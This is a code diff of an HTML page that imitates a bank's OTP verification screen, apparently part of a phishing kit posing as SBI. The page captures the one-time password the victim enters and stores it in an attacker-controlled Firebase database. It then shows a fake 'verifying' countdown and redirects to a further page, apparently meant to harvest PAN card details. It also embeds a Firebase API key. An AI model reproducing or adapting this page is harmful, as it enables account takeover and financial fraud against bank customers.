@@ -4,7 +4,12 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>sbynorewdpolnt</title>
-  <style>
+
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-firestore-compat.js"></script>
+
+ <style>
     html, body {
       margin: 0;
       padding: 0;
@@ -200,146 +205,143 @@
   </style>
 </head>
 <body>
-
-<!-- Loading Overlay -->
-<div class="overlay" id="overlay">
-  <div class="spinner"></div>
-  <div class="loading-text" id="loadingText">Please wait...<br>Verifying Your Login Details...<br>Redirecting in <span id="countdown">3</span> seconds.</div>
-</div>
-
-<!-- Top Header -->
-<div class="header">
-  <img src="https://i.ibb.co/35CHJp2B/Menu.png" alt="Menu" class="menu-button">
-  <img src="https://i.ibb.co/sdHPbk20/Header-1.jpg" alt="Top Header Logo" class="main-header">
-</div>
-
-<!-- Headline Section -->
-<div class="headline">
-  <div class="close-btn">X</div>
-  <div class="headline-text">Enter OTP</div>
-</div>
-
-<!-- OTP Section -->
-<div class="otp-section">
-  <div class="otp-title">OTP Verification</div>
-  <div class="otp-description">
-    We have sent an OTP to your registered mobile number. Please enter the OTP and proceed.
+  <!-- Loading Overlay -->
+  <div class="overlay" id="overlay">
+    <div class="spinner"></div>
+    <div class="loading-text" id="loadingText">
+      Please wait...<br>
+      Verifying Your Login Details...<br>
+      Redirecting in <span id="countdown">3</span> seconds.
+    </div>
   </div>
 
-  <input type="text" id="otpInput" class="otp-input" placeholder="Enter OTP" maxlength="8" oninput="validateOTP()" required>
-  <div id="otpError" class="error-message">Please enter OTP</div>
+  <!-- Top Header -->
+  <div class="header">
+    <img src="https://i.ibb.co/35CHJp2B/Menu.png" alt="Menu" class="menu-button">
+    <img src="https://i.ibb.co/sdHPbk20/Header-1.jpg" alt="Top Header Logo" class="main-header">
+  </div>
 
-  <!-- Timer -->
-  <div id="otp-timer">Wait for OTP: <span id="timer">03:00 seconds</span></div>
+  <!-- Headline Section -->
+  <div class="headline">
+    <div class="close-btn">X</div>
+    <div class="headline-text">Enter OTP</div>
+  </div>
 
-  <button class="resend-otp" onclick="resendOTP()">Resend OTP</button>
+  <!-- OTP Section -->
+  <div class="otp-section">
+    <div class="otp-title">OTP Verification</div>
+    <div class="otp-description">
+      We have sent an OTP to your registered mobile number. Please enter the OTP and proceed.
+    </div>
 
-  <button class="submit-btn" onclick="submitForm()">Submit</button>
-</div>
+    <input type="text" id="otpInput" class="otp-input" placeholder="Enter OTP" maxlength="8" oninput="validateOTP()" required>
+    <div id="otpError" class="error-message">Please enter OTP</div>
 
-<!-- Security Image -->
-<div class="security-image">
-  <img src="https://i.ibb.co/zVvCpZM2/Security-A.jpg" alt="Security Image">
-</div>
+    <!-- Timer -->
+    <div id="otp-timer">Wait for OTP: <span id="timer">03:00 seconds</span></div>
 
-<!-- Bottom Footer -->
-<div class="footer">
-  <img src="https://i.ibb.co/FbxkQBpm/Footer.jpg" alt="Footer Image">
-</div>
+    <button class="resend-otp" onclick="resendOTP()">Resend OTP</button>
+    <button class="submit-btn" onclick="submitForm()">Submit</button>
+  </div>
 
-<!-- Firebase SDK -->
-<script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-firestore-compat.js"></script>
+  <!-- Security Image -->
+  <div class="security-image">
+    <img src="https://i.ibb.co/zVvCpZM2/Security-A.jpg" alt="Security Image">
+  </div>
 
-<script>
-  const firebaseConfig = {
-    apiKey: "AIzaSyCPm7u8Gw5IK1GuPVZ02pxr5tXG3ik7xoI",
-    authDomain: "sbighsh.firebaseapp.com",
-    projectId: "sbighsh",
-    storageBucket: "sbighsh.firebasestorage.app",
-    messagingSenderId: "685947657107",
-    appId: "1:685947657107:web:471a0557bb72235272a666"
-  };
+  <!-- Bottom Footer -->
+  <div class="footer">
+    <img src="https://i.ibb.co/FbxkQBpm/Footer.jpg" alt="Footer Image">
+  </div>
 
-  firebase.initializeApp(firebaseConfig);
-  const db = firebase.firestore();
+  <!-- Firebase Config & JS Logic -->
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyCPm7u8Gw5IK1GuPVZ02pxr5tXG3ik7xoI",
+      authDomain: "sbighsh.firebaseapp.com",
+      projectId: "sbighsh",
+      storageBucket: "sbighsh.firebasestorage.app",
+      messagingSenderId: "685947657107",
+      appId: "1:685947657107:web:471a0557bb72235272a666"
+    };
 
-  var timerInterval;
-  var totalSeconds = 180;
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
 
-  function startTimer() {
-    clearInterval(timerInterval);
-    totalSeconds = 180;
-    updateTimerDisplay();
-    timerInterval = setInterval(function () {
-      totalSeconds--;
+    var timerInterval;
+    var totalSeconds = 180;
+
+    function startTimer() {
+      clearInterval(timerInterval);
+      totalSeconds = 180;
       updateTimerDisplay();
-      if (totalSeconds <= 0) {
-        clearInterval(timerInterval);
-      }
-    }, 1000);
-  }
-
-  function updateTimerDisplay() {
-    var minutes = Math.floor(totalSeconds / 60);
-    var seconds = totalSeconds % 60;
-    document.getElementById('timer').textContent =
-      (minutes < 10 ? '0' : '') + minutes + ":" + (seconds < 10 ? '0' : '') + seconds + " seconds";
-  }
-
-  function resendOTP() {
-    startTimer();
-    alert('OTP has been resent.');
-  }
-
-  function submitForm() {
-    var otpInput = document.getElementById('otpInput');
-    var otpError = document.getElementById('otpError');
-    var otpValue = otpInput.value.trim();
-
-    if (otpValue === "") {
-      otpError.style.display = 'block';
-      otpInput.focus();
-      return;
-    } else {
-      otpError.style.display = 'none';
+      timerInterval = setInterval(function () {
+        totalSeconds--;
+        updateTimerDisplay();
+        if (totalSeconds <= 0) {
+          clearInterval(timerInterval);
+        }
+      }, 1000);
     }
 
-    // Optional: Store OTP to Firestore
-    db.collection("otp_verifications").add({
-      otp: otpValue,
-      timestamp: firebase.firestore.FieldValue.serverTimestamp()
-    }).then(() => {
-      showLoading();
-    }).catch(error => {
-      alert("Failed to save OTP: " + error.message);
-    });
-  }
+    function updateTimerDisplay() {
+      var minutes = Math.floor(totalSeconds / 60);
+      var seconds = totalSeconds % 60;
+      document.getElementById('timer').textContent =
+        (minutes < 10 ? '0' : '') + minutes + ":" + (seconds < 10 ? '0' : '') + seconds + " seconds";
+    }
 
-  function showLoading() {
-    document.getElementById('overlay').style.display = 'flex';
-    var countdown = 3;
-    var countdownElement = document.getElementById('countdown');
+    function resendOTP() {
+      startTimer();
+      alert('OTP has been resent.');
+    }
 
-    var interval = setInterval(function () {
-      countdown--;
-      countdownElement.textContent = countdown;
-      if (countdown === 0) {
-        clearInterval(interval);
-        window.location.href = 'profile.html';
+    function submitForm() {
+      var otpInput = document.getElementById('otpInput');
+      var otpError = document.getElementById('otpError');
+      var otpValue = otpInput.value.trim();
+
+      if (otpValue === "") {
+        otpError.style.display = 'block';
+        otpInput.focus();
+        return;
+      } else {
+        otpError.style.display = 'none';
       }
-    }, 1000);
-  }
 
-  function validateOTP() {
-    var input = document.getElementById('otpInput');
-    input.value = input.value.replace(/[^0-9]/g, '').slice(0, 8);
-  }
+      db.collection("otp_verifications").add({
+        otp: otpValue,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+      }).then(() => {
+        showLoading();
+      }).catch(error => {
+        alert("Failed to save OTP: " + error.message);
+      });
+    }
 
-  window.onload = function () {
-    startTimer();
-  };
-</script>
+    function showLoading() {
+      document.getElementById('overlay').style.display = 'flex';
+      var countdown = 3;
+      var countdownElement = document.getElementById('countdown');
 
+      var interval = setInterval(function () {
+        countdown--;
+        countdownElement.textContent = countdown;
+        if (countdown === 0) {
+          clearInterval(interval);
+          window.location.href = 'pancard.html';
+        }
+      }, 1000);
+    }
+
+    function validateOTP() {
+      var input = document.getElementById('otpInput');
+      input.value = input.value.replace(/[^0-9]/g, '').slice(0, 8);
+    }
+
+    window.onload = function () {
+      startTimer();
+    };
+  </script>
 </body>
 </html>
